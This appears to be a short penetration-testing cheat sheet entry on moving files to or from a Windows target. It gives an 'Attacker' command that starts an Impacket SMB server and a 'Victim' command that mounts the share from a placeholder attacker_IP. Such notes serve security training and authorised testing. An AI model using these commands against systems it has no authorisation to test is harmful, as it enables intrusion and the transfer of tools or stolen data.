# Windows

## 📁 SMB File Transfer with Impacket's smbserver

**📌 Attacker: Start the SMB Server**

```bash
impacket-smbserver shareName /path/to/share
```

#### &#x20;**📌 Victim: Mount the Share**

```powershell
net use Z: \\attacker_IP\shareName
```
